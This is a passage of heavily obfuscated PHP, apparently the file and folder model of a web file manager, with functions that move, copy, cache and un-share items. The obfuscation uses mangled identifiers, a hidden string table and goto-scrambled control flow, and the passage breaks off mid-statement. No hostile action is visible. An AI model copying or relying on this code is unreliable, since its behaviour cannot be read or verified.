Hook::trigger($b˘ßö≠öı†[550], $C∂∑»∆ŸÜÉ); Hook::trigger($b˘ßö≠öı†[551], array($b˘ßö≠öı†[552], $C∂∑»∆ŸÜÉ, 0)); goto fÖ»¬·á¥‚; EûÑøÑó∆¢: } private function _childrenMakeRelation($bœ•∫Øü⁄Õ, $dÍúÑ≤÷Ñ’) { $dëÀÆ‡ãÇÒ =& $_SERVER[Öíæ€“”≠éÏË]; $fŒà—ã‰ÃÑ = array(); $dŸÖª≤§‹Ò = array(); foreach ($bœ•∫Øü⁄Õ as $eµËé«™î) { $eèíÆ‰é∑¨ = $eµËé«™î[$dëÀÆ‡ãÇÒ[28]] . $dëÀÆ‡ãÇÒ[8] . $eµËé«™î[$dëÀÆ‡ãÇÒ[503]]; $fŒà—ã‰ÃÑ[$eèíÆ‰é∑¨] = $eµËé«™î[$dëÀÆ‡ãÇÒ[396]]; } foreach ($dÍúÑ≤÷Ñ’ as $eµËé«™î) { $eèíÆ‰é∑¨ = $eµËé«™î[$dëÀÆ‡ãÇÒ[28]] . $dëÀÆ‡ãÇÒ[8] . $eµËé«™î[$dëÀÆ‡ãÇÒ[503]]; $F¨ä›§£°ê = $fŒà—ã‰ÃÑ[$eèíÆ‰é∑¨]; $dŸÖª≤§‹Ò[$F¨ä›§£°ê] = $eµËé«™î[$dëÀÆ‡ãÇÒ[396]]; } return $dŸÖª≤§‹Ò; } private function _childrenMatch($aÂÉ◊¶ñó≥, $bÖ˜åÆøªü, $aóÁÚáÑΩ˘) { goto dØË¡˜êã¨; AıÒ·Ìµˆ≥: $b¶ÉÖ˜¨ÇÚ = $EûíÖÑóùá[count($EûíÖÑóùá) - 1]; return array($EüÑ“õø†∂[479] => $b¶ÉÖ˜¨ÇÚ, $EüÑ“õø†∂[503] => $Dâ‘ﬂÑ£Ë); goto F‰–°πñ€£; bÏÏŒÿﬂ«‰: foreach ($C∆¬ÕœèÜØ as $A∆ÿÒõµïﬁ) { if (isset($aÂÉ◊¶ñó≥[$A∆ÿÒõµïﬁ])) { $Dâ‘ﬂÑ£Ë .= $aÂÉ◊¶ñó≥[$A∆ÿÒõµïﬁ] . $EüÑ“õø†∂[559]; } } $Dâ‘ﬂÑ£Ë = rtrim($Dâ‘ﬂÑ£Ë, $EüÑ“õø†∂[47]) . $EüÑ“õø†∂[47]; $EûíÖÑóùá = $this->parentLevelArray($Dâ‘ﬂÑ£Ë); goto AıÒ·Ìµˆ≥; dØË¡˜êã¨: $EüÑ“õø†∂ =& $_SERVER[Öíæ€“”≠éÏË]; $Dâ‘ﬂÑ£Ë = $aóÁÚáÑΩ˘[$EüÑ“õø†∂[503]]; $C∆¬ÕœèÜØ = $this->parentLevelArray($bÖ˜åÆøªü[$EüÑ“õø†∂[503]]); goto bÏÏŒÿﬂ«‰; F‰–°πñ€£: } private function _makeItemData($EÎÓÑ¨⁄’ï, $bø∆©ÚŸ˘Ï, $d“≥¯≥Ï˘“) { $fÔ‘¿°Ö™° =& $_SERVER[Öíæ€“”≠éÏË]; $aã‹€ÇÍß = array($fÔ‘¿°Ö™°[560] => $EÎÓÑ¨⁄’ï[$fÔ‘¿°Ö™°[404]], $fÔ‘¿°Ö™°[414] => $d“≥¯≥Ï˘“, $fÔ‘¿°Ö™°[561] => $EÎÓÑ¨⁄’ï[$fÔ‘¿°Ö™°[406]], $fÔ‘¿°Ö™°[449] => $EÎÓÑ¨⁄’ï[$fÔ‘¿°Ö™°[448]], $fÔ‘¿°Ö™°[562] => $EÎÓÑ¨⁄’ï[$fÔ‘¿°Ö™°[78]], $fÔ‘¿°Ö™°[563] => $bø∆©ÚŸ˘Ï[$fÔ‘¿°Ö™°[405]], $fÔ‘¿°Ö™°[564] => $bø∆©ÚŸ˘Ï[$fÔ‘¿°Ö™°[485]], $fÔ‘¿°Ö™°[565] => USER_ID, $fÔ‘¿°Ö™°[566] => USER_ID, $fÔ‘¿°Ö™°[395] => $bø∆©ÚŸ˘Ï[$fÔ‘¿°Ö™°[396]], $fÔ‘¿°Ö™°[567] => $bø∆©ÚŸ˘Ï[$fÔ‘¿°Ö™°[503]] . $bø∆©ÚŸ˘Ï[$fÔ‘¿°Ö™°[396]] . $fÔ‘¿°Ö™°[47], $fÔ‘¿°Ö™°[418] => $EÎÓÑ¨⁄’ï[$fÔ‘¿°Ö™°[84]], $fÔ‘¿°Ö™°[423] => 0, $fÔ‘¿°Ö™°[568] => $fÔ‘¿°Ö™°[33]); return $aã‹€ÇÍß; } private function _copyApplyMeta($FÏûÙ¬ÛòÇ, &$E¨é®óÈõè) { $e›≠Œ–Ç⁄å =& $_SERVER[Öíæ€“”≠éÏË]; $fâ∆ÒÊßùù = $FÏûÙ¬ÛòÇ[$e›≠Œ–Ç⁄å[396]]; $Aîé˘èÛ•» = $FÏûÙ¬ÛòÇ[$e›≠Œ–Ç⁄å[28]]; if (!isset($FÏûÙ¬ÛòÇ[$e›≠Œ–Ç⁄å[569]]) || !$FÏûÙ¬ÛòÇ[$e›≠Œ–Ç⁄å[569]] || $FÏûÙ¬ÛòÇ[$e›≠Œ–Ç⁄å[569]] == $e›≠Œ–Ç⁄å[191]) { $E¨é®óÈõè[$e›≠Œ–Ç⁄å[545]][] = array($e›≠Œ–Ç⁄å[396], $fâ∆ÒÊßùù, $e›≠Œ–Ç⁄å[569], short_id($fâ∆ÒÊßùù)); } if (Input::check($Aîé˘èÛ•», $e›≠Œ–Ç⁄å[570])) { $E¨é®óÈõè[$e›≠Œ–Ç⁄å[544]][] = array($e›≠Œ–Ç⁄å[396] => $fâ∆ÒÊßùù, $e›≠Œ–Ç⁄å[93] => $e›≠Œ–Ç⁄å[445], $e›≠Œ–Ç⁄å[372] => str_replace($e›≠Œ–Ç⁄å[50], $e›≠Œ–Ç⁄å[33], Pinyin::encode($Aîé˘èÛ•»))); $E¨é®óÈõè[$e›≠Œ–Ç⁄å[544]][] = array($e›≠Œ–Ç⁄å[396] => $fâ∆ÒÊßùù, $e›≠Œ–Ç⁄å[93] => $e›≠Œ–Ç⁄å[444], $e›≠Œ–Ç⁄å[372] => Pinyin::encode($Aîé˘èÛ•», $e›≠Œ–Ç⁄å[571])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($a›ñıéÂˆ‹) { goto EÌ¥˘≈Ì§Ì; B≠∞åÁ–√◊: $Déå÷ûŸ»Ÿ = array_to_keyvalue($Déå÷ûŸ»Ÿ, $e¢ãõâœõ€[396]); foreach ($Déå÷ûŸ»Ÿ as $céﬁ⁄ÓÇÎ∑) { $bﬁÊÒß·Õç = $céﬁ⁄ÓÇÎ∑[$e¢ãõâœõ€[479]]; $a›ñıéÂˆ‹ = $céﬁ⁄ÓÇÎ∑[$e¢ãõâœõ€[396]]; if (!isset($this->_childrenListCache[$a›ñıéÂˆ‹]) && $céﬁ⁄ÓÇÎ∑[$e¢ãõâœõ€[404]] == $e¢ãõâœõ€[87]) { $this->_childrenListCache[$a›ñıéÂˆ‹] = array(); } if (!isset($this->_childrenListCache[$bﬁÊÒß·Õç])) { $this->_childrenListCache[$bﬁÊÒß·Õç] = array(); } $this->_childrenListCache[$bﬁÊÒß·Õç][$a›ñıéÂˆ‹] = $céﬁ⁄ÓÇÎ∑; $this->_childrenItemCache[$a›ñıéÂˆ‹] = $céﬁ⁄ÓÇÎ∑; } goto C≤¬©Õ†ôË; EÌ¥˘≈Ì§Ì: $e¢ãõâœõ€ =& $_SERVER[Öíæ€“”≠éÏË]; $F„ù»÷ÌÜú = $this->sourceInfo($a›ñıéÂˆ‹); $Cè∆Ò¿∑°¨ = $e¢ãõâœõ€[425]; goto bŸÿâ¥˘Ë›; bŸÿâ¥˘Ë›: $aÎ£Ï‰Âóå = array($e¢ãõâœõ€[503] => array($e¢ãõâœõ€[526], $F„ù»÷ÌÜú[$e¢ãõâœõ€[503]] . $a›ñıéÂˆ‹ . $e¢ãõâœõ€[527]), $e¢ãõâœõ€[424] => $this->targetIsDelete); $Déå÷ûŸ»Ÿ = $this->field($Cè∆Ò¿∑°¨)->where($aÎ£Ï‰Âóå)->select(); if (!$Déå÷ûŸ»Ÿ) { return; } goto B≠∞åÁ–√◊; C≤¬©Õ†ôË: } private function _childrenListAll($cë¿ƒì©˘≠, &$CºÑ⁄Óí∏î) { $B≥Œ≠≠Œ€Ë =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->_childrenListCache[$cë¿ƒì©˘≠])) { return; } $E∑ûŸ√Ò®Ú = $this->_childrenListCache[$cë¿ƒì©˘≠]; foreach ($E∑ûŸ√Ò®Ú as $dÁíã˘Õˆø => $F»∑«Ø–äﬂ) { $CºÑ⁄Óí∏î[$dÁíã˘Õˆø] = $F»∑«Ø–äﬂ; if ($F»∑«Ø–äﬂ[$B≥Œ≠≠Œ€Ë[404]] == $B≥Œ≠≠Œ€Ë[87]) { $this->_childrenListAll($dÁíã˘Õˆø, $CºÑ⁄Óí∏î); } } } private function sourceInfoCache($Fˆ‘ààÙª‡) { if (isset($this->_childrenItemCache[$Fˆ‘ààÙª‡])) { return $this->_childrenItemCache[$Fˆ‘ààÙª‡]; } return $this->sourceInfo($Fˆ‘ààÙª‡); } private function _childrenList($cçÔÂÉË∑Æ) { if (isset($this->_childrenListCache[$cçÔÂÉË∑Æ])) { return $this->_childrenListCache[$cçÔÂÉË∑Æ]; } return $this->_childrenListSelect($cçÔÂÉË∑Æ); } private function _childrenListSelect($eﬁﬁâË‘åŒ) { goto e åÒá«…É; E·∫ÇÂØ≈Ö: $Fä—éÍˆÛí = $Fä—éÍˆÛí ? $Fä—éÍˆÛí : array(); $a£”§∫Üàπ = array_to_keyvalue($Fä—éÍˆÛí, $D±ÎÈ±»ïä[396]); $this->_childrenListCache[$eﬁﬁâË‘åŒ] = $a£”§∫Üàπ; goto BÖîÀ£Êùê; e åÒá«…É: $D±ÎÈ±»ïä =& $_SERVER[Öíæ€“”≠éÏË]; $a∆¯Õç’ê∞ = array($D±ÎÈ±»ïä[479] => $eﬁﬁâË‘åŒ, $D±ÎÈ±»ïä[424] => $this->targetIsDelete); $Fä—éÍˆÛí = $this->where($a∆¯Õç’ê∞)->select(); goto E·∫ÇÂØ≈Ö; BÖîÀ£Êùê: foreach ($a£”§∫Üàπ as $eﬁﬁâË‘åŒ => $DÉ≤ä¬“” ) { $this->_childrenItemCache[$eﬁﬁâË‘åŒ] = $DÉ≤ä¬“” ; } return $a£”§∫Üàπ; goto aû∫Ëë Ø›; aû∫Ëë Ø›: } private function fileNameExistCache($D∑‚öû®‡©, $dÜ‘ŒéÙä¿) { $dÖ‡Áä –≥ =& $_SERVER[Öíæ€“”≠éÏË]; $dÜ‘ŒéÙä¿ = strtolower($dÜ‘ŒéÙä¿); $BûÚõ≤«òæ = $this->_childrenList($D∑‚öû®‡©); foreach ($BûÚõ≤«òæ as $A‰Ô˘≈òÏ∂) { if ($dÜ‘ŒéÙä¿ == strtolower($A‰Ô˘≈òÏ∂[$dÖ‡Áä –≥[28]])) { return $A‰Ô˘≈òÏ∂[$dÖ‡Áä –≥[396]]; } } return !1; } private function fileNameAutoCache($D√⁄€Õ§È¡, $Eáõ’°≠ÉÒ, $AÂåªù‡Î, $A≥öÁÎ–¨˜) { $F€£©ëåƒÏ =& $_SERVER[Öíæ€“”≠éÏË]; $D∑‘öêﬂÀ∆ = $this->_childrenList($D√⁄€Õ§È¡); $eÓ⁄«ﬁíûº = array_to_keyvalue($D∑‘öêﬂÀ∆, $F€£©ëåƒÏ[33], $F€£©ëåƒÏ[28]); return $this->fileNameAutoGet($eÓ⁄«ﬁíûº, $Eáõ’°≠ÉÒ, $AÂåªù‡Î, $A≥öÁÎ–¨˜); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($aË≈ﬂöŒâû, $fù„ﬂéÑëë, $e Ã∆ÛˆÀ¶ = REPEAT_REPLACE, $fªàÉ®ñÎ® = '') { goto d»≠©á’“ä; eŒ–Êõ∂√«: if ($Cñß ıéëª[$F±≥û¨˜£°[479]] == $fù„ﬂéÑëë && $fªàÉ®ñÎ® != $Cñß ıéëª[$F±≥û¨˜£°[28]]) { $AÉ‘∏€⁄˘º = $this->fileNameExist($fù„ﬂéÑëë, $fªàÉ®ñÎ®); if ($AÉ‘∏€⁄˘º && $Cñß ıéëª[$F±≥û¨˜£°[404]] == $F±≥û¨˜£°[191]) { goto C»§ïπ£ÒÁ; F∞Û¶È°µ›: $this->removeNow($aË≈ﬂöŒâû, !1); $this->folderSizeReset($fù„ﬂéÑëë); Hook::trigger($F±≥û¨˜£°[573], $CˆƒªøŒà…); goto c†Ñ∏áèêó; C»§ïπ£ÒÁ: $e§É≤≥¨⁄ç = $this->sourceInfo($AÉ‘∏€⁄˘º); $F–œ¢ª†à⁄ = $this->fileHistory($e§É≤≥¨⁄ç, $Cñß ıéëª[$F±≥û¨˜£°[448]], $Cñß ıéëª[$F±≥û¨˜£°[78]]); if (!$F–œ¢ª†à⁄) { Model($F±≥û¨˜£°[451])->remove($Cñß ıéëª[$F±≥û¨˜£°[448]]); } goto F∞Û¶È°µ›; c†Ñ∏áèêó: return $AÉ‘∏€⁄˘º; goto d®÷Àùÿ”Ô; d®÷Àùÿ”Ô: } } $e®Ìøà”Ù≥ = $fªàÉ®ñÎ® ? $fªàÉ®ñÎ® : $Cñß ıéëª[$F±≥û¨˜£°[28]]; $this->lockMoveStart($aË≈ﬂöŒâû); goto C¿êÂœ«€ÿ; d»≠©á’“ä: $F±≥û¨˜£° =& $_SERVER[Öíæ€“”≠éÏË]; $Cñß ıéëª = $this->sourceInfo($aË≈ﬂöŒâû); $E¯òáøäÓŸ = $this->sourceInfo($fù„ﬂéÑëë); goto aìâ≥¬˘®™; C¿êÂœ«€ÿ: $this->lockWriteStart($fù„ﬂéÑëë, $e®Ìøà”Ù≥); $cõ†æâÜ©€ = array($F±≥û¨˜£°[543] => array(), $F±≥û¨˜£°[574] => !1); $this->clearShare($aË≈ﬂöŒâû, $fù„ﬂéÑëë); goto dŒÔáâÛ¨¬; FÙÇø÷·ÀÁ: $this->lockMoveEnd($aË≈ﬂöŒâû); $this->lockWriteEnd($fù„ﬂéÑëë, $e®Ìøà”Ù≥); $this->folderSizeReset($Cñß ıéëª[$F±≥û¨˜£°[479]]); goto BÜ€¬»É—; fø•íû—Öå: if (!$Cñß ıéëª || !$E¯òáøäÓŸ || $E¯òáøäÓŸ[$F±≥û¨˜£°[404]] != $F±≥û¨˜£°[87]) { return !1; } Hook::trigger($F±≥û¨˜£°[572], $CˆƒªøŒà…); $this->targetIsDelete = intval($Cñß ıéëª[$F±≥û¨˜£°[424]]); goto eŒ–Êõ∂√«; BÜ€¬»É—: $this->folderSizeReset($fù„ﬂéÑëë); $EÓè öÿë˜ = array($Cñß ıéëª[$F±≥û¨˜£°[479]], $fù„ﬂéÑëë); if ($Cñß ıéëª[$F±≥û¨˜£°[404]] == $F±≥û¨˜£°[87]) { $EÓè öÿë˜[] = $aË≈ﬂöŒâû; } goto e¡Àìé°Æ√; dŒÔáâÛ¨¬: $EÜàΩÍÔ¯â = $this->fileNameExistCache($fù„ﬂéÑëë, $Cñß ıéëª[$F±≥û¨˜£°[28]]); $eÑÇÏ“âêÇ = $this->_move($aË≈ﬂöŒâû, $fù„ﬂéÑëë, $e Ã∆ÛˆÀ¶, $cõ†æâÜ©€, $fªàÉ®ñÎ®); $this->sourceCacheClear(); goto aæáÉ‡€‚; aìâ≥¬˘®™: if ($Cñß ıéëª[$F±≥û¨˜£°[479]] == $E¯òáøäÓŸ[$F±≥û¨˜£°[396]]) { if ($Cñß ıéëª[$F±≥û¨˜£°[424]] == $F±≥û¨˜£°[87]) { Model($F±≥û¨˜£°[422])->restore(array($aË≈ﬂöŒâû)); } if (!$fªàÉ®ñÎ® || $fªàÉ®ñÎ® == $Cñß ıéëª[$F±≥û¨˜£°[28]]) { return $aË≈ﬂöŒâû; } } $CˆƒªøŒà… = $this->pathInfoMore($aË≈ﬂöŒâû); if ($this->isParentOf($aË≈ﬂöŒâû, $fù„ﬂéÑëë)) { return !1; } goto fø•íû—Öå; e¡Àìé°Æ√: $this->updateModifyTime($EÓè öÿë˜); Model($F±≥û¨˜£°[547])->eventMove($aË≈ﬂöŒâû, $Cñß ıéëª[$F±≥û¨˜£°[479]], $fù„ﬂéÑëë); Hook::trigger($F±≥û¨˜£°[573], $CˆƒªøŒà…); goto B¢»…ºéñ≥; B¢»…ºéñ≥: return $eÑÇÏ“âêÇ; goto DÀ™âÓª««; aæáÉ‡€‚: if ($Cñß ıéëª[$F±≥û¨˜£°[404]] == $F±≥û¨˜£°[87] && $EÜàΩÍÔ¯â) { $this->folderSizeResetChildren($eÑÇÏ“âêÇ); } Model($F±≥û¨˜£°[193])->linkAdd($cõ†æâÜ©€[$F±≥û¨˜£°[543]]); if ($EÜàΩÍÔ¯â && $cõ†æâÜ©€[$F±≥û¨˜£°[574]]) { $this->removeNow($aË≈ﬂöŒâû, !1); } goto FÙÇø÷·ÀÁ; DÀ™âÓª««: } private function _move($cÀÖ‡«ÁÖ‡, $Aí∂ñ‚Ô€Â, $F˘èÛã©◊Ü, &$e„ªﬁâıå†, $C∫⁄Œéı§ì = '') { goto FΩ’≈ã≠û§; C±ï∑îêº≠: $BÉÛÑüßòù = !1; if ($F¨úΩ∞ÜÜ) { if ($F˘èÛã©◊Ü == REPEAT_RENAME_FOLDER) { $f§°∑Ç∫¢û = $this->fileNameAuto($Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û, $F˘èÛã©◊Ü, $F¨úΩ∞ÜÜ); $A¢úóÃêûç = $this->_moveForce($cÀÖ‡«ÁÖ‡, $Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û); } else { if ($F˘èÛã©◊Ü == REPEAT_RENAME_FOLDER) { $F˘èÛã©◊Ü = REPEAT_RENAME; } $AØúïÏ≥çã = $this->_childrenListSelect($cÀÖ‡«ÁÖ‡); foreach ($AØúïÏ≥çã as $bÛ™ÛΩ¨«å) { $this->_move($bÛ™ÛΩ¨«å[$AÊ™Üøó‡ÿ[396]], $CíÆ€¯èµÚ, $F˘èÛã©◊Ü, $e„ªﬁâıå†); } $BÉÛÑüßòù = !0; } } else { if ($F˘èÛã©◊Ü == REPEAT_SKIP) { $BÉÛÑüßòù = !0; } else { if ($F˘èÛã©◊Ü == REPEAT_RENAME || $F˘èÛã©◊Ü == REPEAT_RENAME_FOLDER) { $f§°∑Ç∫¢û = $this->fileNameAuto($Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û, $F˘èÛã©◊Ü, $F¨úΩ∞ÜÜ); $A¢úóÃêûç = $this->_moveForce($cÀÖ‡«ÁÖ‡, $Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û); } else { if ($F˘èÛã©◊Ü == REPEAT_REPLACE) { $bÍåä÷ç·∆ = $this->sourceInfoCache($CíÆ€¯èµÚ); $aÀÑ´ˆí÷Æ = $this->fileHistory($bÍåä÷ç·∆, $bÿêÈ·ñ‡ƒ[$AÊ™Üøó‡ÿ[448]], $bÿêÈ·ñ‡ƒ[$AÊ™Üøó‡ÿ[78]]); if ($aÀÑ´ˆí÷Æ) { $e„ªﬁâıå†[$AÊ™Üøó‡ÿ[543]][] = $bÿêÈ·ñ‡ƒ[$AÊ™Üøó‡ÿ[448]]; } else { $BÉÛÑüßòù = !0; } } } } } if ($BÉÛÑüßòù && !$e„ªﬁâıå†[$AÊ™Üøó‡ÿ[574]]) { $e„ªﬁâıå†[$AÊ™Üøó‡ÿ[574]] = !0; } goto fπº€Ïﬂ©ä; fπº€Ïﬂ©ä: return $A¢úóÃêûç; goto aÛ¯≠Íô•Æ; FΩ’≈ã≠û§: $AÊ™Üøó‡ÿ =& $_SERVER[Öíæ€“”≠éÏË]; $bÿêÈ·ñ‡ƒ = $this->sourceInfo($cÀÖ‡«ÁÖ‡); $F¨úΩ∞ÜÜ = $bÿêÈ·ñ‡ƒ[$AÊ™Üøó‡ÿ[404]] == $AÊ™Üøó‡ÿ[87]; goto EÌ„õÔÙèÃ; EÌ„õÔÙèÃ: $f§°∑Ç∫¢û = $C∫⁄Œéı§ì ? $C∫⁄Œéı§ì : $bÿêÈ·ñ‡ƒ[$AÊ™Üøó‡ÿ[28]]; $CíÆ€¯èµÚ = $this->fileNameExistCache($Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û); $this->lockMoveStart($cÀÖ‡«ÁÖ‡); goto Eó”ãÍÑ·ì; Eó”ãÍÑ·ì: $this->lockWriteStart($Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û); if (!$CíÆ€¯èµÚ) { return $this->_moveForce($cÀÖ‡«ÁÖ‡, $Aí∂ñ‚Ô€Â, $f§°∑Ç∫¢û); } $A¢úóÃêûç = $CíÆ€¯èµÚ; goto C±ï∑îêº≠; aÛ¯≠Íô•Æ: } private function _moveForce($F≈∞Òéßáı, $f®«“≠Æ â, $cÜãî¯Çôû) { goto fü¯‰†ëŒÃ; fü¯‰†ëŒÃ: $DÇ‚êÑ√¿— =& $_SERVER[Öíæ€“”≠éÏË]; $e‰˘“ì«˜∆ = $this->sourceInfo($F≈∞Òéßáı); $c≠¯áŒ€Ãç = $this->sourceInfo($f®«“≠Æ â); goto FÌı‚ö‚—é; FÌı‚ö‚—é: $aõ—ΩﬁÑ ò = $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[404]] == $DÇ‚êÑ√¿—[87]; $Dºπ¢î≤∂— = array($DÇ‚êÑ√¿—[395] => $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[396]], $DÇ‚êÑ√¿—[567] => $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[503]] . $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[396]] . $DÇ‚êÑ√¿—[47], $DÇ‚êÑ√¿—[563] => $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[405]], $DÇ‚êÑ√¿—[564] => $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[485]], $DÇ‚êÑ√¿—[566] => USER_ID, $DÇ‚êÑ√¿—[414] => $cÜãî¯Çôû); $E’îŸ¡∆≥≥ = $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[405]] == SourceModel::TYPE_GROUP && $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[405]] == SourceModel::TYPE_GROUP && $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[485]] == $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[485]]; goto FàÿÜ¥ÏÈ¿; EÃëÊÜÀÙÁ: if ($aõ—ΩﬁÑ ò) { $E”üí˘⁄ò» = array($DÇ‚êÑ√¿—[567] => array($DÇ‚êÑ√¿—[526], $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[503]] . $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[396]] . $DÇ‚êÑ√¿—[527])); $C÷—˜úØ’£ = $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[503]] . $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[396]] . $DÇ‚êÑ√¿—[47]; $Câ∫àè‰ñ¨ = $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[503]] . $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[396]] . $DÇ‚êÑ√¿—[47] . $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[396]] . $DÇ‚êÑ√¿—[47]; $D∫ú–◊›‘· = array($DÇ‚êÑ√¿—[567] => array($DÇ‚êÑ√¿—[575], "\162\x65\160\x6c\141\x63\145\x28\x70\141\162\x65\156\164\114\145\166\x65\154\x2c\x27{$C÷—˜úØ’£}\x27\54\x27{$Câ∫àè‰ñ¨}\x27\x29"), $DÇ‚êÑ√¿—[563] => $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[405]], $DÇ‚êÑ√¿—[564] => $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[485]]); if ($DôÑôı€‘Ç) { $D∫ú–◊›‘·[$DÇ‚êÑ√¿—[423]] = 0; } $this->where($E”üí˘⁄ò»)->data($D∫ú–◊›‘·)->save(); } $this->where(array($DÇ‚êÑ√¿—[411] => $F≈∞Òéßáı))->data($Dºπ¢î≤∂—)->save(); return $F≈∞Òéßáı; goto F§ØÛ•‡√ë; FàÿÜ¥ÏÈ¿: if (!$E’îŸ¡∆≥≥ && $this->moveClearAuth) { Model($DÇ‚êÑ√¿—[483])->authClear($F≈∞Òéßáı); } $DôÑôı€‘Ç = $e‰˘“ì«˜∆[$DÇ‚êÑ√¿—[424]] == $DÇ‚êÑ√¿—[87] && $c≠¯áŒ€Ãç[$DÇ‚êÑ√¿—[424]] != $DÇ‚êÑ√¿—[87]; if ($DôÑôı€‘Ç) { $Dºπ¢î≤∂—[$DÇ‚êÑ√¿—[423]] = 0; } goto EÃëÊÜÀÙÁ; F§ØÛ•‡√ë: } private function clearShare($DœŒ£èµΩÔ, $d‚¿ÜºâÁ≈) { goto eŸìÇÿ™ë…; eŸìÇÿ™ë…: $B»ÚÚﬁ’ø“ =& $_SERVER[Öíæ€“”≠éÏË]; $eΩ’êÏ¥Øﬁ = $this->sourceInfo($DœŒ£èµΩÔ); $fÖåÚ∑»Ç… = $this->sourceInfo($d‚¿ÜºâÁ≈); goto eƒàö∞äﬁ£; eƒàö∞äﬁ£: if ($eΩ’êÏ¥Øﬁ[$B»ÚÚﬁ’ø“[485]] == $fÖåÚ∑»Ç…[$B»ÚÚﬁ’ø“[485]] && $eΩ’êÏ¥Øﬁ[$B»ÚÚﬁ’ø“[405]] == $B»ÚÚﬁ’ø“[576]) { return; } $d—÷úÏØ—∆ = array($B»ÚÚﬁ’ø“[503] => array($B»ÚÚﬁ’ø“[526], $eΩ’êÏ¥Øﬁ[$B»ÚÚﬁ’ø“[503]] . $DœŒ£èµΩÔ . $B»ÚÚﬁ’ø“[527])); $C¯≈è‹√ﬂ¯ = $this->field($B»ÚÚﬁ’ø“[411])->where($d—÷úÏØ—∆)->getField($B»ÚÚﬁ’ø“[396], !0); goto DõÕ≠˘ªàÀ; a†Ëè†ƒ¡›: Model($B»ÚÚﬁ’ø“[577])->where($d—÷úÏØ—∆)->save(array($B»ÚÚﬁ’ø“[476] => 0)); Model($B»ÚÚﬁ’ø“[578])->where($d—÷úÏØ—∆)->delete(); goto Fπ√û¯àâ—; cö◊∂œ±åÜ: if (!$CÌÆ√âîéÜ) { return; } $CÌÆ√âîéÜ = array_to_keyvalue($CÌÆ√âîéÜ, $B»ÚÚﬁ’ø“[33], $B»ÚÚﬁ’ø“[469]); $d—÷úÏØ—∆ = array($B»ÚÚﬁ’ø“[469] => array($B»ÚÚﬁ’ø“[7], $CÌÆ√âîéÜ)); goto a†Ëè†ƒ¡›; DõÕ≠˘ªàÀ: if (!$C¯≈è‹√ﬂ¯) { return; } $d—÷úÏØ—∆ = array($B»ÚÚﬁ’ø“[396] => array($B»ÚÚﬁ’ø“[7], $C¯≈è‹√ﬂ¯), $B»ÚÚﬁ’ø“[476] => 1); $CÌÆ√âîéÜ = Model($B»ÚÚﬁ’ø“[577])->field($B»ÚÚﬁ’ø“[469])->where($d—÷úÏØ—∆)->select(); goto cö◊∂œ±åÜ; Fπ√û¯àâ—: } public function copyFolderFromIO($e•Ó£ÊèÑë, $aù–¶úı≥É, $E¶∏·¬ıÍê, $f«Ö≠óåæ…, $Bàòæë—∑ª, $C‹˜•Ñ¥≠ã = false) { goto aâ∂— ∆‡—; Fõ≤îπ¬ÿù: Model($e±ŸùËΩ„Ü[451])->linkAdd($eêçâÑﬁãﬁ[$e±ŸùËΩ„Ü[543]]); Model($e±ŸùËΩ„Ü[451])->remove($eêçâÑﬁãﬁ[$e±ŸùËΩ„Ü[579]]); $this->folderSizeReset($E¶∏·¬ıÍê); goto E„éòôﬂ◊¢; e§¨·œÿ·Ñ: Model($e±ŸùËΩ„Ü[546])->addAll($eêçâÑﬁãﬁ[$e±ŸùËΩ„Ü[544]], array(), !0); Model($e±ŸùËΩ„Ü[547])->eventCopy($F˘Ò›Ë√£´); $this->saveAll($eêçâÑﬁãﬁ[$e±ŸùËΩ„Ü[545]]); goto Fõ≤îπ¬ÿù; aâ∂— ∆‡—: $e±ŸùËΩ„Ü =& $_SERVER[Öíæ€“”≠éÏË]; $eêçâÑﬁãﬁ = array($e±ŸùËΩ„Ü[544] => array(), $e±ŸùËΩ„Ü[545] => array(), $e±ŸùËΩ„Ü[543] => array(), $e±ŸùËΩ„Ü[579] => array()); $d∆∑Ü⁄ıƒÖ = $C‹˜•Ñ¥≠ã ? $C‹˜•Ñ¥≠ã : $e•Ó£ÊèÑë->pathThis($aù–¶úı≥É); goto EÖêË‘…´æ; D≤≈Ú˜©ô£: Hook::trigger($e±ŸùËΩ„Ü[581]); if ($F˘Ò›Ë√£´) { $this->folderSizeResetChildren($F˘Ò›Ë√£´); } $this->_childrenListClear(); goto e§¨·œÿ·Ñ; Eêπ©∫êòŸ: if ($dÕ˘úçêÒÎ) { $this->_childrenAllMake($dÕ˘úçêÒÎ); } Hook::trigger($e±ŸùËΩ„Ü[580]); $this->_copyChildTo($e•Ó£ÊèÑë, $aù–¶úı≥É, $F˘Ò›Ë√£´, $f«Ö≠óåæ…, $eêçâÑﬁãﬁ, $Bàòæë—∑ª); goto D≤≈Ú˜©ô£; EÖêË‘…´æ: $dÕ˘úçêÒÎ = $this->fileNameExist($E¶∏·¬ıÍê, $d∆∑Ü⁄ıƒÖ); $F˘Ò›Ë√£´ = $this->mkdir($E¶∏·¬ıÍê, $d∆∑Ü⁄ıƒÖ, $f«Ö≠óåæ…); if 